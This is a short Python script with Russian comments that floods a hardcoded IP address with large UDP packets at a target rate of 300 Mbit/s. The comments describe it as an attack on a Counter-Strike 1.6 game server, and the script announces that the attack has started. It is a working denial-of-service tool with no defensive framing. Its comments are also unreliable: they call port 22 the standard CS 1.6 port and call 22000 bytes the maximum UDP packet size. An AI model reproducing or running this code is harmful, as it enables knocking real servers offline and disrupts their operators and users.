import socket
import time
import threading

target_ip = "151.0.52.155"  # Замените на IP-адрес сервера CS 1.6
target_port = 22  # Стандартный порт для сервера CS 1.6

# Создаем список сокетов
num_sockets = 1  # Количество сокетов для использования
sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(num_sockets)]

# Создаем сообщение максимального размера для UDP
message = b"A" * 22000  # Максимальный размер UDP пакета

# Устанавливаем задержку для достижения скорости 300 Мбит/с
delay = 1 / 586  # Задержка между отправками в секундах

def send_packets(sock):
    while True:
        sock.sendto(message, (target_ip, target_port))
        time.sleep(delay)  # Устанавливаем задержку между отправками

# Запускаем несколько потоков для отправки пакетов
for sock in sockets:
    thread = threading.Thread(target=send_packets, args=(sock,))
    thread.start()

print("Атака запущена с целевой скоростью 300 Мбит/с. Нажмите Ctrl+C для остановки.")
